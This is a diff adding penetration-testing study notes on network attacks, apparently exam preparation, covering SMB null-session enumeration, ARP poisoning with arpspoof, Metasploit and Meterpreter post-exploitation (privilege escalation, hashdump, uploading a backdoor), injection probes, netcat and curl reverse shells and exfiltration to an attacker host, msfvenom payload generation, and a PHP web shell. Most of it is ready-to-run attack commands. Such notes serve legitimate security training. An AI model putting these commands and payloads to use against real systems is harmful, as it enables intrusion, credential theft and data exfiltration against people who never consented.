@@ -664,3 +664,173 @@ NETWORK ATTACKS
     - Attack exploits an authentication vulnerability for Windows Administrative Shares
         - Lets attacker connect to local or remote share without authentication
     - Enumerating
+    * Nbtstat lets you enumerate Windows shares
+    > nbtstat -A <IP> //Gives information on host at IP
+    > NET VIEW <IP> //Enumerates shares
+    $ nmblookup -A <IP>
+    $ smbclient -L //10.130.40.80 -N //-L looks at services available on target -N forces tool not to ask for password
+    @ Null session attack will exploit IPC$ admin share by trying to connect without creds
+        > NET USE \\<IP>\IPC$ '' /u:''
+        - Only works with IPC$
+        $ smbclient //10.130.40.80/IPC$ -N
+    $ enum -S <IP> //Enumerates shares
+    $ enum -U <IP> //Enumerates users
+    $ enum -P <IP> //Enumerates password policy
+        - Prevents account locking
+        - Prevents false positives
+        - Choose dictionary or brute forcer configuration
+        - Knowing min and max length of password saves time while brute forcing
+    > winfo <IP> -n //-n Use null session attack
+    - Enum4linux
+        - User enumeration
+        - Share enumeration
+        - Group and member enumeration
+        - Password policy extraction
+        - OS information detection
+        - Nmblookup run
+        - Printer information extraction
+    $ enum4linux -n <IP> //nmblookup on IP
+    $ enum4linux -P <IP>
+    $ enum4linux -S <IP>
+    $ enum4linux -s /usr/share/enum4linux/share-list.txt <IP>
+    $ enum4linux -a <IP> //All options
+    $ ./usr/share/doc/python-impacket-doc/examples/samrdump.py <IP>
+    $ nmap -script=smb-enum-shares <IP>
+    $ nmap -script=smb-enum-users <IP>
+    $ nmap -script=smb-brute <IP>
+- ARP Poisoning
+    * Used to intercept traffic on a switched network
+    - To send an IP packet, host needs to know MAC of next hop (router, switch, or dest host)
+    - To identify MAC, computers use ARP
+        - (IP 192.168.7.3 MAC 11:22:33:44:55:66) Who has 192.168.7.9?:Tell 192.68.7.3 -> FF:FF:FF:FF:FF:FF
+        - (IP 192.168.7.9 MAC 77:88:99:AA:BB:CC) 192.168.7.9 is at 77:88:99:AA:BB:CC -> 11:22:33:44:55:66
+    - After MAC resolution, hosts save the dest address in their ARP cache table
+    * Manipulate ARP cache to receive traffic destined to other IP addresses
+        - Works because as long as MAC is in ARP cache, sender does not run ARP for that dest host
+    - Manipulate ARP table of two parties involved with communication
+        - Sniff whole communication
+        - Man-in-the-middle attack (MITM)
+        - Done by sending gratuitous ARP replies
+    * ARP Poisoning Attack
+        - 3 actors (two network nodes [clients, servers, routers, printers, ...] and attacker)
+        @ Network
+            A   IP 192.168.7.3 MAC 11:22:33:44:55:66
+            B   IP 192.168.7.9 MAC 77:88:99:AA:BB:CC
+            X   IP 192.168.7.7 MAC DD:EE:00:11:22:33
+        - Gratuitous ARP reply is unsolicited (sent without receiving any requests)
+        @ X ->  192.168.7.9 is at DD:EE:00:11:22:33 -> 11:22:33:44:55:66
+            * Performed on every victim
+        @ X ->  192.168.7.r is at DD:EE:00:11:22:33 -> 77:88:99:AA:BB:CC
+        - As soon as ARP cache table contains fake info, every packet of communication between poisoned nodes is sent to attacker
+        - Prevent poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds
+        * Soon as attacker receives packets must forward them to correct destination
+        - Op lets hacker sniff traffic between the poisoned hosts even if machines sit on switched network
+        * Lets attacker manipulate packets
+        - Attack can be used on an entire network and against a router
+            - Lets attacker intercept communication between a LAN and the internet
+    - Dsniff
+        - Collection of tools for network auditing and pen testing
+        - Contains arpspoof
+            - Intercepts traffic on a switched LAN
+        $ echo 1 > /proc/sys/net/ipv4/ip_forward
+        $ arpspoof -i <interface> -t <target> -r <host>
+            - Interface is NIC you want to use (eth0 for local LAN)
+            - Target and Host are victims IP addresses
+        $ arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
+            - Intercepts traffic between 192.168.4.11 and 192.168.4.16
+            - Run Wireshark to intercept traffic
+- Metasploit
+    - Interface, exploits, payloads, exploit handling
+    * MSFConsole workflow
+        - Identify vulnerable service
+        - Search for proper exploit
+        - Load and configure exploit
+        - Load and configure payload
+        - Run exploit and get access
+    $ msfconsole //baby
+    - Payloads
+        - OS shell
+        - VNC or RDP connection
+        - Meterpreter shell
+        - Execution of application
+    - Meterpreter
+        > ifconfig  //Info on network config
+        > sysinfo   //Info on machine and OS
+        > getuid    //Get user info
+        > route     //Gets routing information
+        > getsystem //Performs privesc
+            > search bypassuac //If getsystem does not work due to Windows UAC
+        - bind_tcp runs a server process on target machine and weaits for connections from attacker
+        - reverse_tcp performs TCP connection back to attacker machine
+        > background //Moves session to background
+        > download HaxLogs.log /root/
+        > upload /root/backdoor.exe C:\\Windows
+        > shell
+    @ Metepreter session (backdoor)
+        > background
+        - Migrate process
+            > ps -U SYSTEM //Displays only processes with system priveleges
+            - Choose process
+            > migrate 616
+        > hashdump
+- Remote Code Eexecution
+    - Usually result of different vulnerability
+        - Unrestrected file uploading, command or OS injection, sql injection, ...
+    @ Injection attempts
+        - ls
+        - <?php phpinfo();?>
+        - <script>alert(1)</script>
+        - sleep+5
+        - ping+<ATTACKER IP>+-c+5
+    - Uploads shell.php
+    $ ls /usr/bin //Shows tools
+    $ which nc, curl, python, wget
+    * Attacker
+        $ nc -lvp 53
+    * Victim
+        $ nc <ATTACKER IP> -e /bin/bash
+        $ curl http://<ATTACKER IP>:53/`whoami`
+        $ curl http://<ATTACKER IP>:53/`id|base64`
+        $ curl http://<ATTACKER IP>:53/file -T /etc/issue
+    @ Example
+        $ python -m SimpleHTTPServer 8080
+        $ msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.139.130 lport=53 -f elf -o reverse53
+        $ curl http://<ATTACKER IP>:9090/reverse53 -o /tmp/r
+        $ chmod +x /tmp/r
+        $ curl http://<ATTACKER IP>:9090 -T /tmp/r
+        $ /tmp/r
+        * Upgrade session
+            $ bash -i
+            $ python -c 'import pty; pty.spawn("/bin/sh")'
+- Shells
+    - ASP shells on Windows server
+    - JSP shells on Apache Tomcat
+    - PHP shells on Apache
+    @ PHP shell
+        <html>
+        <?php
+
+        echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
+        system($_GET["cmd]);
+
+        ?>
+        </html>
+    * Pentestmonkey cheat-sheet shells
+    $ msfvenom --list payloads | grep x64 | grep linux | grep reverse
+    $ msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o r443
+    $ chmod +x r443
+        > use exploit/multi/handler
+        > set payload linux/x64/shell/reverse_tcp
+        > set lhost 0.0.0.0
+        > set lport 443
+    $ msfvenom --list payloads | grep php | grep reverse
+    $ msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o r443.php
+        > use exploit/multi/handler
+        > set payload php/reverse_tcp
+        > set lhost 192.168.0.58
+        > set lport 443
+    * use post/multi/manage/shell_to_meterpreter
+        > set lhost 192.168.0.58
+        > set lport 8443
+    > sessions -K
+    > jobs -K
